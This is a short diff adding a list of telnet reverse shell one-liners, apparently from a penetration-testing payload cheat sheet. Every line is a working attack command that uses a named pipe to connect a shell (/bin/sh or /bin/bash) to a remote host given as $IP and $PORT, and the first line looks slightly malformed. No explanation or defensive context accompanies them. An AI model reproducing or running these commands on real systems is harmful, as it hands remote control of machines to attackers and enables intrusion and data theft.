@@ -1,0 +1,5 @@
+TELNET REVERSE SHELL
+rm -f /tmp/p; mknod /tmp/p p && telnet $IP $PORT 0/tmp/p
+telnet $IP 80 | /bin/bash | telnet $IP $PORT
+mknod a p && telnet $IP $PORT 0<a | /bin/sh 1>a
+TF=$(mktemp -u);mkfifo $TF && telnet $IP $PORT 0<$TF | sh 1>$TF
